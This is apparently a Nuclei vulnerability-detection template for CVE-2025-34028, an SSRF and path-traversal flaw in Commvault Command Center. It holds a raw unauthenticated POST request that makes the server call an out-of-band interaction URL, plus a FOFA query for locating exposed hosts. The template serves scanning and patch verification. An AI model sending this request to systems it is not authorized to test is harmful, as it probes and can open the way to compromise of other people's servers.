http:
- matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")
    - status_code == 900
    type: dsl
  raw:
  - 'POST /commandcenter/deployWebpackage.do HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    Content-Type: application/x-www-form-urlencoded


    commcellName={{interactsh-url}}&servicePack={{string}}&version=x

    '
id: CVE-2025-34028
info:
  author: DhiyaneshDk,abhishekrautela
  classification:
    cve-id: CVE-2025-34028
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-22
    epss-percentile: 0.97495
    epss-score: 0.45932
  description: 'A path traversal vulnerability in Commvault Command Center Innovation
    Release allows an unauthenticated actor to upload ZIP files, which, when expanded
    by the target server, result in Remote Code Execution. This issue affects Command
    Center Innovation Release: 11.38.

    '
  impact: 'Unauthenticated attackers can exploit SSRF through ZIP file uploads containing
    path traversal sequences, potentially leading to remote code execution on the
    Commvault server.

    '
  metadata:
    fofa-query: icon_hash="1209838013"
    max-request: 1
    verified: true
  name: Commvault - SSRF via /commandcenter/deployWebpackage.do
  reference:
  - https://documentation.commvault.com/securityadvisories/CV_2025_04_1.html
  - https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/
  - https://nvd.nist.gov/vuln/detail/CVE-2025-34028
  remediation: 'Apply the security patch as described in Commvault''s security advisory
    for Command Center Innovation Release 11.38.

    '
  severity: critical
  tags: cve,cve2025,ssrf,oast,commvault,kev,vkev,vuln
variables:
  string: '{{to_lower(rand_base(5))}}'
